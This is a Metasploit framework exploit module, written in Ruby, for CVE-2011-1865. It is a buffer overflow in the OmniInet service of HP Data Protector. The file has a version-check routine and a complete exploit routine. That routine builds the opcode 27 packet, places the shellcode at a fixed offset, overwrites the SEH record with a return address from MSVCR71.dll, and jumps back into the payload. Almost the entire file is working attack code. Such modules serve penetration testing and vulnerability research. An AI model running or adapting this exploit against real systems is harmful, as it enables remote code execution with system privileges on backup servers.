# $Id: hp_omniinet_3.rb 13081 2011-07-01 22:26:12Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP OmniInet.exe Opcode 27 Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a  buffer overflow in the Hewlett-Packard
                OmniInet NT Service. By sending a specially crafted opcode 27 packet,
                a remote attacker may be able to execute arbitrary code.
            },
            &#039;Author&#039;         => [ &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13081 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-1865&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities&#039; ],
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },
            &#039;Payload&#039; =>
                {
                    &#039;Space&#039;    => 800,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;HP Data Protector A.06.10 Build 611 / A.06.11 Build 243&#039;,
                        {
                            #POP/POP/RET from OmniBack\bin\MSVCR71.dll
                            &#039;Ret&#039; => 0x7c35630d
                        }
                    ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jun 29 2011&#039;))
 
        register_options([Opt::RPORT(5555)], self.class)
    end
 
    def check
 
        connect
        sock.put(rand_text_alpha_upper(64))
        resp = sock.get_once(-1,5)
        disconnect
 
        if (resp)
            resp = resp.unpack(&#039;v*&#039;).pack(&#039;C*&#039;)
            print_status("Received response: " + resp)
 
            # extract version
            if (resp =~ /HP Data Protector/)
                version = resp.split[3]
            elsif (resp =~ /HP OpenView Storage Data Protector/)
                version = resp.split[5]
            elsif (resp =~ /HP StorageWorks Application Recovery Manager/)
                version = resp.split[5]
            else
                return Exploit::CheckCode::Detected
            end
 
            version = version.split(&#039;.&#039;)
            major = version[1].to_i
            minor = version[2].to_i
            if ((major < 6) or (major == 6 and minor < 11))
                return Exploit::CheckCode::Vulnerable
            end
 
            if ((major > 6) or (major == 6 and minor >= 11))
                return Exploit::CheckCode::Safe
            end
 
        end
        return Exploit::CheckCode::Safe
 
    end
 
    def exploit
 
        connect
 
        trigger = rand_text_alpha_upper(10000)
        trigger[4552, payload.encoded.length] = payload.encoded
        trigger[5352, 8] = generate_seh_record(target.ret)
        trigger[5360, 5] = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-788").encode_string
 
        opcode = "27"
 
        packet = Rex::Text.to_unicode("\x00")
        packet << "\x27\xca" #length
        packet << "\xff\xfe\x32"
        packet << "\x00\x00\x00"
        packet << Rex::Text.to_unicode("\x20\x61\x00") * 3
        packet << Rex::Text.to_unicode("\x20")
        packet << trigger
        packet << Rex::Text.to_unicode("\x00")
        packet << Rex::Text.to_unicode("\x20\x61\x00")
        packet << Rex::Text.to_unicode("\x20" + opcode + "\x00")
        packet << Rex::Text.to_unicode("\x20\x61\x00") * 24
 
        print_status("Trying #{target.name}...")
        sock.put(packet)
         
        select(nil,nil,nil,10)
        handler
        disconnect
 
    end
 
end



